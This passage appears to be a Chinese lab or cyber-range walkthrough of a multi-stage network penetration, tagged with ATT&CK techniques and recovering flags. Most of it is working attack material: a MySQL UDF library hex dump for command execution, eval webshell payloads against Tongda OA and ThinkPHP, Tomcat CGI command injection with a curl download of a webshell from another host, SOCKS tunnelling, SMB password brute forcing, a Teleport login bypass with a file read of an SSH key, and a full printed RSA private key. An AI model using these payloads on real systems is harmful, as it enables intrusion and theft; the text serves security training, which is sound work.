6C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400')into dumpfile '/usr/lib64/mysql/plugin/udf.so';
```

![image-20221205094726062007-1671607514568136.png](http://192.168.79.239/ct/upload/other/08fe38ce21a308173501e70367495a11.png)

创建自定义函数`sys_eval`：

```
create function sys_eval returns string soname "udf.so";
```

![image-20221205095638033864-1671607516131330.png](http://192.168.79.239/ct/upload/other/026543050330d2afd49b018a21ee500f.png)

查看当前用户：

```
select sys_eval('whoami');
```

![image-20221205095830182624-1671607517986072.png](http://192.168.79.239/ct/upload/other/e056a4310d8aef6a63a51b2630a3a3bb.png)

查看flag：

```
select sys_eval('cat ../../../flag');
```

![image-20221208140916290424-1671607519539730.png](http://192.168.79.239/ct/upload/other/861830a9a721763170d28dc02fdb4656.png)

```
flag{420C-F951-70C6-BA2F-9564-E904-CD9D-A69F}
```

显示登录历史记录：

```
select sys_eval('last');
```

![image-20221205101945844023-1671607521130506.png](http://192.168.79.239/ct/upload/other/633ea89c00ef1a3273d566a69a97e958.png)

双击结果获取内网网段：

![image-20221208140400604732-1671607522975765.png](http://192.168.79.239/ct/upload/other/0ca64df7f3237bd99c28bd2742c5a163.png)

##### 任务4：准备内网渗透（T1090-代理、T1572-协议隧道、T1596-主动扫描、T1592-收集主机信息）

```
本场景的第4个任务是通过ew工具搭建流量代理并使用fscan收集内网信息。

EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。六种链路状态，通过 -s 参数选定，分别为:ssocksd rcsocks rssocks lcx_slave lcx_tran lcx_listen。

该任务可以通过以下操作完成。
```

进入 `C:\Users\Administrator\Desktop\工具\流量代理\ew`目录，将`ew_for_Win_ms.exe`通过拖拽的方式上传至蚁剑的`C:/phpStudy/PHPTutorial/Apache/cgi-bin/`目录：

![image-20221205143037418055-1671607524534895.png](http://192.168.79.239/ct/upload/other/57d2ecc5979aaa131d4dbe532676854b.png)

启动终端：

![image-20221205143113960908-1671607526135378.png](http://192.168.79.239/ct/upload/other/d061e13868e3afe3c9d367640ab3d81b.png)

执行命令开启`socks5`代理服务：

```
ew_for_Win_ms.exe -s ssocksd -l 10010

##-s为要启用的服务类型；
##-l为主机开放的端口；
```

![image-20221205162407028645-1671607527705528.png](http://192.168.79.239/ct/upload/other/70e7bba0d94a0db32302ffc4263456ae.png)

启动全局代理工具`Proxifier`：

![image-20221217150856347963-1671607529276370.png](http://192.168.79.239/ct/upload/other/2fdf3b003013619f7ea61aeaa5bbbbfb.png)

![image-20221217150907316848-1671607530860899.png](http://192.168.79.239/ct/upload/other/fa0e597f745f4296b3396991341d754c.png)

点击`Profile`>>`Proxy Servers...`：

![image-20221205143712926770-1671607532419890.png](http://192.168.79.239/ct/upload/other/2d5a1ee3047ceb71dd4f02f74d9b8578.png)

点击`Add...`添加代理服务器，配置如下：

```
10.10.10.123 10010

##Protocol选择SOCKS Version 5
```

![image-20221205161952782317-1671607534003206.png](http://192.168.79.239/ct/upload/other/43a94b95f12937f30779977530a91ca4.png)

![image-20221205165114849638-1671607535556178.png](http://192.168.79.239/ct/upload/other/5abfb932dc9e6cacd51ee9337fdd6893.png)

![image-20221205162131936470-1671607537130534.png](http://192.168.79.239/ct/upload/other/bef37f1d65ffcb6af39e631387554ee4.png)

![image-20221205165239457918-1671607538710687.png](http://192.168.79.239/ct/upload/other/004ad0a70b227a8b67c68900e7e42193.png)

点击`Profile`>>`Proxification Rules...`配置规则：

![image-20221205165341231995-1671607540449326.png](http://192.168.79.239/ct/upload/other/d05df67fa5441cbdf788547fffa11e88.png)

点击`Add...`，规则如下：

```
Target hosts：192.168.11.*;
```

![image-20221213113801956505-1671607542007038.png](http://192.168.79.239/ct/upload/other/09df784b372715833b9a909f2003ec85.png)

![image-20221205165648580950-1671607543609114.png](http://192.168.79.239/ct/upload/other/841c355ff7e93d8f3fcf39c56ab784b2.png)

若代理失效，退出全局代理工具`proxifier`后执行以下命令重启服务，再启动`proxifier`：

```
taskkill /f /im ew_for_Win_ms.exe

ew_for_Win_ms.exe -s ssocksd -l 10010
```

![image-20221206102417046131-1671607545185033.png](http://192.168.79.239/ct/upload/other/40bf9ce83636994dacdce3e22f98b17a.png)

使用fscan工具执行命令探测内网网段：

```
fscan.exe -h 192.168.11.1-254 -p 22,80,3389,8080 -t 100 -np

##-h 指定目标主机及网段；
##-p 指定端口；
##-t 指定线程，防止线程太高导致代理失效；
##-np 不探测存活，直接扫描；
```

![image-20221205163101456922-1671607546744419.png](http://192.168.79.239/ct/upload/other/621e2d15ff12755fa67c8090683595aa.png)

`proxifier`的弹窗点击`Cancel`：

![image-20221208143443865525-1671607548342157.png](http://192.168.79.239/ct/upload/other/bdfc7e6c2b9b6147ec7b8a3ffec5df74.png)

探测内网情况如下：

```
192.168.11.200 3389 8080

192.168.11.210 80 3389 通达OA

192.168.11.211 80 3389 SchoolCMS
```

##### 任务5：OA主机渗透（T1102-网络服务、T1082-文件和目录发现）

```
本场景的第5个任务是利用通达OA的命令执行漏洞获取webshell及使用蚁剑的文件管理功能找到关键文件。

通达OA的v11.9版本，getdata接口存在命令执行漏洞，可以执行某些命令。构造payload后可以直接访问到webshell，并且不需要上传任何文件和执行任何命令。通达OA默认是开启disable function的，危险函数都被禁用了，连接webshell后会不能执行命令，但是可以管理文件，这便是突破口。

该任务可以通过以下操作完成。
```

访问OA：

```
http://192.168.11.210
```

![image-20221205163627077061-1671607550144441.png](http://192.168.79.239/ct/upload/other/722e0b898d46d17b9f03b4f7157b23ab.png)

访问注册页面查看OA版本：

```
http://192.168.11.210/inc/expired.php
```

![image-20221205170636201535-1671607551720288.png](http://192.168.79.239/ct/upload/other/aea56b21c337bf9f58fc96a5d6be4cf3.png)

通达OA为v11.9版本，存在命令执行漏洞；浏览器访问下方内容验证漏洞是否存在：

```
http://192.168.11.210/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage
```

![image-20221217151753174736-1671607553352089.png](http://192.168.79.239/ct/upload/other/c2b8351d41cff757dbb25f8775e4f4ce.png)

其中`ZWNobyB2dWxuX3Rlc3Q7`为base64加密后的`echo vuln_test;`命令，页面输出`vuln_test`，说明漏洞存在；构造webshell：

```
http://192.168.11.210/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[pass]))%3B/*&id=19&module=Carouselimage
```

![image-20221205171147057854-1671607555060310.png](http://192.168.79.239/ct/upload/other/74dd0ca201f8f9744aad9cc31d4ecd0f.png)

使用蚁剑连接：

```
URL地址：http://192.168.11.210/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval($_POST[pass]))%3B/*&id=19&module=Carouselimage

连接密码：pass
```

![image-20221205171249206622-1671607556714085.png](http://192.168.79.239/ct/upload/other/b79bf0fdffd4468cde2a74deb11fa0c7.png)

进入终端：

![image-20221206172259153534-1671607559036724.png](http://192.168.79.239/ct/upload/other/dcef1ead8c844b4c4b00015d0f9fca8e.png)

执行命令无回显，禁用了部分函数：

![image-20221205171558793584-1671607560894846.png](http://192.168.79.239/ct/upload/other/6c6dd6d13f42cc4264cc8d2d70fb2cbd.png)

进入OA备份文件目录`C:/MYOA/bak/TD_OA/`，获取flag：

![image-20221208143716071175-1671607562509234.png](http://192.168.79.239/ct/upload/other/42de56fbe0bfd7fb1e72ee9e929a31e9.png)

```
flag{48FC-CC7E-E00B-7295-9140-2C4E-5004-0B31}
```

![image-20221208143854952448-1671607564097752.png](http://192.168.79.239/ct/upload/other/750246a55a809307663f98be2981c5f4.png)

将数据库备份压缩包下载到本地桌面：

![image-20221217154423653792-1671607565813924.png](http://192.168.79.239/ct/upload/other/7e621d2d6b70a085f7e05c37471022cc.png)



双击压缩包，右击`user.sql`文件点击`查看文件`：

![image-20221205172551668475-1671607567402774.png](http://192.168.79.239/ct/upload/other/6206b21989202ad1629c63d8eb20a5ab.png)

发现内网地址段`192.168.80.0/24`：

![image-20221205172704855879-1671607568996484.png](http://192.168.79.239/ct/upload/other/5991eb3dfa6890f11abf111a8757ab7d.png)

##### 任务6：教务系统主机渗透（T1078-有效账户、T1190-利用面向公众的应用程序、T1102-网络服务）

```
本场景的第6个任务是利用thinkphp的缓存文件生成webshell。

ThinkPHP，是为了简化企业级应用开发和敏捷WEB应用开发而诞生的开源轻量级PHP框架。ThinkPHP能够解决应用开发中的大多数需要，因为其自身包含了底层架构、兼容处理、基类库、数据库访问层、模板引擎、缓存机制、插件机制、角色认证、表单处理等常用的组件，并且对于跨版本、跨平台和跨数据库移植都比较方便。thinkphp3.2.3存在经典漏洞：缓存函数不当使用导致临时文件变木马。临时文件的默认存储路径是：/Application/Runtime/Temp/。

该任务可以通过以下操作完成。
```

访问教务系统：

```
http://192.168.11.211
```

![image-20221205173651027708-1671607570618941.png](http://192.168.79.239/ct/upload/other/a7da759f11c3f5c05a9f56e02e186f68.png)

发现使用的是`schoolcms`，尝试访问默认后台：

```
http://192.168.11.211/admin.php
```

![image-20221205173912233579-1671607572211298.png](http://192.168.79.239/ct/upload/other/32c21c312847ab83cf7586b5fc35bd03.png)

`schoolcms`为`thinkphp`框架，查看`thinkphp`版本：

```
http://192.168.11.211/thinkphp/ThinkPHP.php
```

![image-20221207093102861523-1671607573858379.png](http://192.168.79.239/ct/upload/other/f97e6614b3f6102105832365a40ef922.png)

`thinkphp`版本为`V3.2.3`，存在缓存漏洞；回到后台登录页面，使用默认密码成功后台：

```
admin/schoolcms
```

![image-20221205173804725932-1671607575436274.png](http://192.168.79.239/ct/upload/other/5adc3d8fb9715a3e3495da3e0ef5fc80.png)

利用缓存漏洞可以缓存包含webshell的临时文件；点击`站点配置`>>`站点设置`，在此页面可以利用缓存文件上传webshell：

![image-20221217155008782085-1671607577155798.png](http://192.168.79.239/ct/upload/other/9cdef245b54648a98c700d24a5064b1a.png)

burpsuite设置socks代理，点击`User options` ，`SOCKS proxy`模块中输入代理服务器信息后勾选`Use socks proxy`：

![image-20221205164019095609-1671607578757376.png](http://192.168.79.239/ct/upload/other/eacb151746021dffc68eecc609df6f26.png)

点击`Proxy`>>`Intercept is on`关闭抓包，点击`Intercept is off`开启抓包：

![image-20221206174406356502-1671607580354976.png](http://192.168.79.239/ct/upload/other/349b0a5100e7fda52a8d2657ca21626e.png)

浏览器设置`Burp Suite`代理后点击底部的`保存`按钮：

![image-20221214135057893156-1671607581905778.png](http://192.168.79.239/ct/upload/other/ad9e0c105a562b9dd4fb3500792b4486.png)

回到burpsuite的`Proxy`，点击`Forword`对数据包进行放行，找到POST请求数据包：

![image-20221205175252795219-1671607583489291.png](http://192.168.79.239/ct/upload/other/e4cae7a26ef16d6530021e79ffc0cb3d.png)

在`SchoolCMS`下方插入一句话木马后发送到`Repeater`：

```
@eval($_POST['pass']);//
```

![image-20221205175620039354-1671607585067516.png](http://192.168.79.239/ct/upload/other/54481c369cee086e75f064f4a282dcc2.png)

点击`Repeater`>>`Send`，`code`为0表示写入成功：

![image-20221208144506276810-1671607586648860.png](http://192.168.79.239/ct/upload/other/446c674f69eb1125c479ede1986da101.png)

浏览器切换为系统代理：

![image-20221205175950982402-1671607588258154.png](http://192.168.79.239/ct/upload/other/ba7764d65309c8b08c764a301b79bf25.png)

访问临时文件目录：

```
http://192.168.11.211/Application/Runtime/Temp/
```

![image-20221205180022589285-1671607589919581.png](http://192.168.79.239/ct/upload/other/7f00195d33c8a5e84c6ff1573c2b1b89.png)

`38432eb7369925b9a826f2b9f64e2262.php`为webshell文件，点击超链接访问：

![image-20221206174932146978-1671607591609570.png](http://192.168.79.239/ct/upload/other/115d8f6fdbb5bd488acf87ad3497fa94.png)

![image-20221205185929875499-1671607593184425.png](http://192.168.79.239/ct/upload/other/bd55b219f63bff201e65407a5c1a5a7b.png)

使用蚁剑连接：

```
URL地址：http://192.168.11.211/Application/Runtime/Temp/38432eb7369925b9a826f2b9f64e2262.php

连接密码：pass
```

![image-20221205190024236485-1671607594762114.png](http://192.168.79.239/ct/upload/other/63b0340a943b66c1b3a0f243243a0729.png)

进入终端执行命令：

```
whoami
```

![image-20221205190137798440-1671607596321179.png](http://192.168.79.239/ct/upload/other/511d435b2f256861771ffc58ba9a275b.png)

进入`C:/Users/Administrator/Desktop/`目录，获取flag：

![image-20221208144801814417-1671607597896846.png](http://192.168.79.239/ct/upload/other/007264ad22bd99d5cccba1dd45e1335f.png)

```
flag{0450-B88C-D025-918B-631E-941C-3ED6-4804}
```

##### 任务7：一卡通主机渗透（T1190-利用面向公众的应用程序、T1102-网络服务、T1202-间接命令执行、T1105-入口工具传输）

```
本场景的第7个任务是通过tomcat的远程命令执行漏洞渗透一卡通系统主机。

Apache Tomcat是美国阿帕奇（Apache）软件基金会的一款轻量级Web应用服务器。该程序实现了对Servlet和JavaServer Page（JSP）的支持。Apache官方发布通告称将在新版本中修复一个远程代码执行漏洞（CVE-2019-0232），由于JRE将命令行参数传递给Windows的方式存在错误，会导致CGI Servlet受到远程执行代码的攻击。

该任务可以通过以下操作完成。
```

访问一卡通系统：

```
http://192.168.11.200:8080
```

![image-20221205190330568130-1671607599472711.png](http://192.168.79.239/ct/upload/other/6b39a3972e2712a39a404d70fccaea73.png)

通过dirsearch工具进行目录扫描：

```
python3 dirsearch.py -u http://192.168.11.200:8080
```

发现存在首页`index.html`，但访问`http://192.168.11.200:8080/index.html`会自动跳转到其他界面：

![image-20221219100919414487-1671607601096527.png](http://192.168.79.239/ct/upload/other/f44799555600e706fc8e7851aa230a48.png)

访问不存在页面`http://192.168.11.200:8080/campuscard/main-2.html`，获取Tomcat版本号：

![image-20221205190514446721-1671607602686531.png](http://192.168.79.239/ct/upload/other/6efe65a5e259a052fc0066397cfbd8ab.png)

抓取首页`http://192.168.11.200:8080/campuscard/main.html`的GET请求包并发送到`Repeater`：

![image-20221208165521359437-1671607604278078.png](http://192.168.79.239/ct/upload/other/6433e4b9ecbfc5dbf8f816aa5cf4dde0.png)

修改数据包的请求地址并发送：

```
/index.html
```

![image-20221214142614682046-1671607606149869.png](http://192.168.79.239/ct/upload/other/7a889fdb78771853eb9f7823dec5929e.png)

获取cgi脚本名称及路径，切换浏览器代理后访问：

```
http://192.168.11.200:8080/cgi-bin/hello.bat
```

![image-20221208170003712523-1671607607696584.png](http://192.168.79.239/ct/upload/other/a7ef6ff42d3d5c817f0de39da6a391c9.png)

测试是否存在漏洞：

```
http://192.168.11.200:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cnet.exe+user
```

![image-20221205190628638808-1671607609259906.png](http://192.168.79.239/ct/upload/other/469877d68f9174bbd407a02e4d41aa10.png)

查看权限：

```
http://192.168.11.200:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Cwhoami
```

![image-20221205190825207260-1671607610847330.png](http://192.168.79.239/ct/upload/other/1a9f2f2f5d5a6580b1ffc7771e62b2cf.png)

进入`C:\Users\Administrator\Desktop\工具\shell\Behinder_v3.0_Beta_11.t00ls\server`目录，将`shell.jsp`文件上传至蚁剑`10.10.10.123`主机的`C:/phpStudy/PHPTutorial/WWW/`目录下：

![image-20221208170254009809-1671607612453871.png](http://192.168.79.239/ct/upload/other/22ce0e4c074b7256b10d0f9e8473dbbe.png)

执行命令获取物理路径：

```
http://192.168.11.200:8080/cgi-bin/hello.bat?dir
```

![image-20221206175701993738-1671607614028068.png](http://192.168.79.239/ct/upload/other/66fcef5346d4628d4b84bc7ae6b80a2f.png)

利用curl命令将webshell进行下载：

```
http://192.168.11.200:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccurl+-o+C:%5CTomcat%5Capache-tomcat-8.5.39%5Cwebapps%5CROOT%5Cshell.jsp+10.10.10.123/shell.jsp

##-o：保存下载的文件到指定的文件中
```

![image-20221205195853923835-1671607615628616.png](http://192.168.79.239/ct/upload/other/481e6bd7ed48d5ad21deec04ec4e657a.png)

访问webshell验证是否存在：

```
192.168.11.200:8080/shell.jsp
```

![image-20221205195914400114-1671607617337667.png](http://192.168.79.239/ct/upload/other/d153ef452f881e99758984ae16bc9941.png)

进入`C:\Users\Administrator\Desktop\工具\shell\Behinder_v3.0_Beta_11.t00ls`目录，双击`Behinder.jar`启动冰蝎工具：

![image-20221205200452643754-1671607619649406.png](http://192.168.79.239/ct/upload/other/32e40d9eb5033b9eadd8c0e86f5a3da5.png)

右击空白处点击`新增`：

![image-20221205200518341789-1671607621455776.png](http://192.168.79.239/ct/upload/other/3a73a7d2f4510be8c80f317d563be1b0.png)

shell连接方式如下，配置完成后点击`保存`：

```
URL：http://192.168.11.200:8080/shell.jsp

密码：rebeyond
```

![image-20221205200717934763-1671607623086913.png](http://192.168.79.239/ct/upload/other/fc5cd90112ab9bdcd1f4b7acda0c9f7a.png)

双击shell进行连接，出现环境变量时shell连接成功：

![image-20221205200943534939-1671607624729498.png](http://192.168.79.239/ct/upload/other/b6b57bd88f6eeb88139cc4d6fcd60856.png)

点击`命令执行`，执行命令查看当前用户权限：

![image-20221205201124129095-1671607626305758.png](http://192.168.79.239/ct/upload/other/3f069b58ea22a654f38f751e036322a0.png)

点击`文件管理`>>`打开`：

![image-20221208170659759186-1671607627943726.png](http://192.168.79.239/ct/upload/other/b88057bc85cdd03be0d6da5ba14fd77d.png)

![image-20221208170754208126-1671607629533556.png](http://192.168.79.239/ct/upload/other/cfa8d407b1b75f0474bd289f1cbf993c.png)

进入`C:/Tomcat/apache-tomcat-8.5.39/webapps/ROOT/`目录，发现flag：

![image-20221208171049746693-1671607631170776.png](http://192.168.79.239/ct/upload/other/699cc9b200ceb2b15dcfc76534860501.png)

![image-20221208171141346573-1671607632788614.png](http://192.168.79.239/ct/upload/other/53baded355f6818f9fad24cfcf7392a0.png)

```
flag{DF91-6A0D-BF2B-AE82-A529-F389-67E2-4CBC}
```

#### 阶段三：内网用户渗透

##### 任务8：运维主机渗透（T1596-主动扫描、T1110-暴力破解、T1022-远程服务）

```
本场景的第8个任务是通过fscan的密码爆破功能爆破主机密码。

弱密码（Weak passwords）即容易破译的密码，多为简单的数字组合、帐号相同的数字组合、键盘上的临近键或常见姓名，例如“123456”、“abc123”、“Michael”等。终端设备出厂配置的通用密码等都属于弱密码范畴。密码爆破又叫暴力猜解 , 简单来说就是将密码逐个尝试, 直到找出真正的密码为止。fscan有爆破功能:各类服务爆破(ssh、smb、rdp等)、数据库密码爆破(mysql、mssql、redis、psql、oracle等)

该任务可以通过以下操作完成。
```

`proxifier`工具代理规则中新增目标网段：

```
192.168.10.*;
```

![image-20221208201016101251-1671607634416795.png](http://192.168.79.239/ct/upload/other/b19b15f1144fd721bce8e72fe6a05187.png)

![image-20221219104511335661-1671607636043040.png](http://192.168.79.239/ct/upload/other/2bb4a169b18118cf54f2cec46acbf1fc.png)

使用fscan工具进行扫描：

```
fscan.exe -h 192.168.10.1-254 -p 22,80,3389,8080 -t 100 -np
```

![image-20221206100308986003-1671607637693383.png](http://192.168.79.239/ct/upload/other/7a13adf3d0c0f75cd5de979ac1e10b39.png)

发现两台存活主机，分别是Linux操作系统和Windows操作系统：

```
192.168.10.100 22
192.168.10.101 3389
```

将`C:\Users\Administrator\Desktop\工具\内网渗透\端口扫描\fscan`目录下的`fscan.exe`文件上传至蚁剑`10.10.10.123`主机的`C:/phpStudy/PHPTutorial/Apache/bin/`目录下：

![image-20221206105240849746-1671607639281225.png](http://192.168.79.239/ct/upload/other/41756029d30637d0122f6d0832b73078.png)

在该目录下启动终端：

![image-20221209094252177597-1671607641000147.png](http://192.168.79.239/ct/upload/other/bfe68e9475e8f6c3cb3df99349cb4001.png)

执行命令扫描存活主机全端口：

```
fscan.exe -h 192.168.10.100 -p 1-65535 -np -o 100.txt
```

![image-20221206105454647125-1671607642576286.png](http://192.168.79.239/ct/upload/other/b9eac6fd6d6288a80231deb8c9163c15.png)

刷新`C:/phpStudy/PHPTutorial/Apache/bin/`目录，双击`100.txt`文件查看结果：

![image-20221219135329676358-1671607644150007.png](http://192.168.79.239/ct/upload/other/ef4be5844d04f96ad92f307b2ef5740e.png)

执行命令扫描另一台主机全端口：

```
fscan.exe -h 192.168.10.101 -p 1-65535 -np -o 101.txt
```

![image-20221206110038819243-1671607645813326.png](http://192.168.79.239/ct/upload/other/878038b2b1798ba2a8503acde7bc3f36.png)

![image-20221219135726171515-1671607647568854.png](http://192.168.79.239/ct/upload/other/d37fa89288dc9e072d57dc3a328bf561.png)

进入`C:\Users\Administrator\Desktop\工具\字典\passwordDict\`目录，将`top500.txt`文件上传至蚁剑`10.10.10.123`主机的`C:/phpStudy/PHPTutorial/Apache/bin/`目录中：

![image-20221206145812062657-1671607649223081.png](http://192.168.79.239/ct/upload/other/8cc139ea55bed7598f30c50070b0965c.png)

在该目录下执行命令爆破主机3389端口：

```
fscan.exe -h 192.168.10.101 -m smb -pwdf top500.txt
```

![image-20221206145935426703-1671607650866184.png](http://192.168.79.239/ct/upload/other/a879d6ce4a1d1c2660480e698caacb04.png)

获取到登录信息后启动远程桌面：

![image-20221219140049541692-1671607652482760.png](http://192.168.79.239/ct/upload/other/ec6125441d45b7163dc399310eb6fa4d.png)

远程主机信息如下：

```
远程主机地址：192.168.10.101

用户名：administrator

登录密码：qwerty
```

![image-20221206150444370722-1671607654081902.png](http://192.168.79.239/ct/upload/other/4ba4bec80ca1faee269850fdef58a7ed.png)

登录成功后桌面发现flag：

![image-20221208172240444405-1671607655664785.png](http://192.168.79.239/ct/upload/other/138d2abef935b25ef3cc022a79e9bfaf.png)

![image-20221208172447333080-1671607657366934.png](http://192.168.79.239/ct/upload/other/b703a665adc3e83754d3d0b6e2ec3e85.png)

```
flag{D849-1BCA-C799-FE98-D4B4-57CF-A27F-2C66}
```

##### 任务9：堡垒机渗透（T1190-利用面向公众的应用程序、T1592-收集主机信息、T1567-通过 Web 服务进行外泄、T1552-不安全的凭据）

```
本场景的第9个任务是通过任意用户登录和任意文件读取漏洞结合使用获取堡垒机权限。

逻辑设计缺陷是由于应⽤在最初设计时由于未考虑全⾯，在登录、注册、找回密码、⽀付模块中程序的判断逻辑及程序的处理流程上存在缺陷，导致攻击者可以绕过程序的处理流程，从⽽达到特定的⽬的，如暴⼒破解密码，任意⽤户注册、任意用户登录、任意密码重置及各种⽀付漏洞。⼀些⽹站的需求，可能会提供⽂件查看与下载的功能。如果对⽤户查看或下载的⽂件没有限制或者限制绕过，就可以查看或下载任意⽂件。这些⽂件可以是源代码⽂件，配置⽂件，敏感⽂件等等。从权限角度将，读取与下载都属于都权限。

该任务可以通过以下操作完成。
```

在`win10-tools`主机中启动浏览器进行访问：

```
http://192.168.10.100:7190
```

![image-20221206111205931001-1671607658894472.png](http://192.168.79.239/ct/upload/other/87d3867ce9289dd4dddad66f3a80c2a9.png)

页面底部发现teleport版本号，该版本存在任意用户登录漏洞和后台任意文件读取漏洞：

![image-20221206111314742639-1671607660468572.png](http://192.168.79.239/ct/upload/other/b2355e2084212578725321488c8761de.png)

关闭burpsuite的包拦截，输入任意账户密码，填写正确的验证码，开启burpsuite的包拦截，浏览器切换为`Burp Suite`代理后点击`登录`：

![image-20221206111942577467-1671607662158537.png](http://192.168.79.239/ct/upload/other/b8826ed7f0e2f97cede5cc0e8b847119.png)

回到burpsuite，释放GET请求包，找到POST请求包并发送到`Repeater`：

![image-20221206112352637441-1671607663790778.png](http://192.168.79.239/ct/upload/other/9c96946883eb21144c651037c8d38e70.png)

URL解码args的值可获得验证码（Decode as URL）：

![image-20221206112712611161-1671607665341057.png](http://192.168.79.239/ct/upload/other/7f9862e44cafb9e41c07bb060abe20d4.png)

在`Repeater`中修改数据包后点击`Send`：

```
/auth/do-login

args={"type":2,"username":"admin","password":null,"captcha":"xxxx","oath":"","remember":false}

##captcha参数的值为验证码；
```

![image-20221206112913959320-1671607666944556.png](http://192.168.79.239/ct/upload/other/a556734b5714d92e53db0f4141341478.png)

code为0即为成功，关闭burpsuite包拦截，切换浏览器代理访问`192.168.10.100:7190/dashboard`进入后台：

![image-20221206113153180800-1671607668763703.png](http://192.168.79.239/ct/upload/other/8cb8efd96f461d686768d12291820386.png)

在`资产`>>`主机及账号`中发现新目标：

![image-20221206185340288803-1671607670615250.png](http://192.168.79.239/ct/upload/other/945b40d653a9e08692646c34fc1c647a.png)

```
192.168.100.50
192.168.100.80
```

读取主机私钥文件：

```
http://192.168.10.100:7190/audit/get-file?f=/root/.ssh/id_rsa&rid=1&type=rdp&act=read&offset=0
```

![image-20221206114622278046-1671607672332938.png](http://192.168.79.239/ct/upload/other/28089997003a95b2442a998a7148ac8c.png)

在任意命令行中ssh连接`kali-tools`主机：

```
ssh root@10.100.1.10

yes

kali@2022
```

![image-20221206134123796314-1671607673944600.png](http://192.168.79.239/ct/upload/other/717bbee7d105b04a047ecac7eb16d471.png)

配置代理规则：

```
vim /etc/proxychains4.conf
```

![image-20221206133804862293-1671607675645238.png](http://192.168.79.239/ct/upload/other/fbf2580b3b433276e35a3ed33b8fb517.png)

进入`.ssh`目录，vim命令新建私钥文件`id_rsa`：

```
cd /root/.ssh

vim id_rsa

##私钥文件内容如下：
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAkxdF+UNntnJQ8OdZdY3pzs8HAfsZNXeNEhCakc7Z5rCa/WEV hYs6tEI4FGSFsGtSVg1EMKKmNEfsVPFbsXX2eDKBsy9HqBvIcIT4p51CdK9EMibz nNpHCaXizzH2VJuZ6urBwucCZ+/oIs7gXUUg32hJpW/E059F2q9CPcdW81kULqe7 MoHemYsQbg38LXCBjGL3ZWNIB6uYznSZPYkxna9ejDTLlLyyutWAu0hc5pnBvrSu USuivkEGCy8VIh0BO4j0rzVZ4/noYyBkz7/2T2vCKvXraJt6hlLfYM39MBBzx1Zg HAsQSI18MoyywBC3Sj0CBI3DkVfJ4/MbvezHXwIDAQABAoIBAGyrSxUGyX6vIkF4 ik0hFVWm+gRqoIsx0dVA0xFaAv4+B6OesCnDXRGDwq6+PU7DW0cb8f8Ei0ogwOdY kWegQQE4Pz5Edeoq7IDEnHgo5MoUGov63wxI7yafmdt9jAGiG6rE2XXG+a4UPipJ MNV3lvu2roI8+utlxlP0GzpNJV4OmPIa9ABPSRWypWYTp/yAVh3iRVgIQ5j/cTH7 ZjcH2feBNCA46HZd1uYVNkqe+gVM0r8hbSX8ZoTld1za6eOO3w37uDNYMxiD0jkP H3eHCliZR5d2Dlfki5mj+SXSCZHz1iO6dG1RBIBO+ArbrTPz3B3mzSOk3S010kSl KXp0a3ECgYEAwmBObe0jATBvEw6ADJ8nRAv8Z8WNKiN0UxvW8d+YAkYRNmSk2AhT f2Eg8LcjCZ7lDkRRJC2Rw6jXB/D9G4VL+qV2i9AZ0mund0bHCUMgywpCMYytGOOm O+DVFIKWy3ADkSbbAk7ke9xsVaPWIA9CWAvt6X8SUXaBLxt38U0Wj40CgYEAwblD fxowEKOkHEodO0ePxPipzFz2/r4e6wCp5enPzmiSv7OuO7wBajuevBIeYo8Ubrjv wc6H7HbWdGYAvxcg70ERwMhu+z9PQ/v+ilPrDYlOky8a7gDCrgRWSBqXFn0uCTyq URTUAPwNZTviTG9i3CQZrZbC1JMurCeaO7YJkZsCgYAf3Neeb2v4iu76Sbs11nUC U5Cplhmg2bT81qhyd7ucS84Qg4j+HMdLLynOK8cjkZdsskg2zP2C/E9bbuaet0gQ K0V2f8Nr2dfW1pRT8VwTzHezVaMeXFron99uAEYlzRPYnGz0QOh1YVmk5Dl6geXX NwVl7D2devaMOU19EazsFQKBgAiEHWx7+TryBqfbtjdB6RcOm2BJge4m63MHP3DE +4amYDUfL/yeQi2qW0sHPOC2S36mkJujeaQygTDyvvunh6Ic6SvhY8eVu+VQMZth HwckTxj3TCbET8qYlDZtPNEXRavQR+hykvNMIUafAE694smsqJhR9VSk97tHrmcL lJYbAoGAaYcO/+VZ+m5Mt9xzOlKCbQRgNMCOHMQw9VDvfIuxkdxNt8p58i69DZID 8kQ2zT9jQCgswBCJb8o0NeKYn9Wtt3UU9uBUTO7OpqB/7UEb2YAkpBDWnIC1Dln2 U546uFsHzKQ9c0aPeYmTd0mbsROgJ+4BJFtJXt12O20Rg+P1xkM=
-----END RSA PRIVATE KEY-----
```

执行命令赋予私钥文件权限：

```
chmod 700 id_rsa
```

![image-20221206132639655289-1671607677314090.png](http://192.168.79.239/ct/upload/other/08da22af9f3c3c4a7b8c011ac75374c0.png)

执行命令免密登录目标：

```
